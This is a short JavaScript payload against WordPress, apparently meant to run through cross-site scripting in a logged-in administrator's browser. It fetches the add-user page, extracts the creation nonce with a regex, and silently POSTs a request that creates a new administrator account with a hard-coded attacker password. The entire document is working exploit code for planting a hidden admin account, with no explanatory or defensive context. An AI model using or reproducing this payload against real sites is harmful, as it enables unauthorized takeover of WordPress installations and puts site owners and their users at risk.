/*
Target: Wordpress - tested on 5.1.1 but probably works on other versions
*/
var wp_root = "https://itpm.com" // don't add a trailing slash
var req = new XMLHttpRequest();
var url = wp_root + "/wp-admin/user-new.php";
var regex = /ser" value="([^"]*?)"/g;
req.open("GET", url, false);
req.send();
var nonce = regex.exec(req.responseText);
var nonce = nonce[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=race_condition&email=race_condition@intigriti.me&pass1=AttackerP456&pass2=AttackerP456&role=administrator";
req.open("POST", url, true);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send(params);
